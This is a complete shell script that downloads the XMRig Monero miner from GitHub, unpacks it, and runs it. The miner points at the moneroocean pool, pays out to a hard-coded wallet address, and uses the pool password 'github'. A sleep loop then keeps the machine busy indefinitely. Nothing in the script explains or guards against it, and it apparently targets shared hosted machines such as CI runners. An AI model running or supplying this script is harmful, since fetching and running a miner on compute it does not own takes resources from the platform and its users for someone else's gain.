#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -o gulf.moneroocean.stream:10128 -a rx -k -u 87aqsvgBj65eNz3a6fwcJgCvL5YW2jrQ4XBryFKHXK4dMJRUVjVuLtEaSQVTgRCsgo4sJXugq9Xz5LJs6u8rSHy45pZuHqE -p github --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
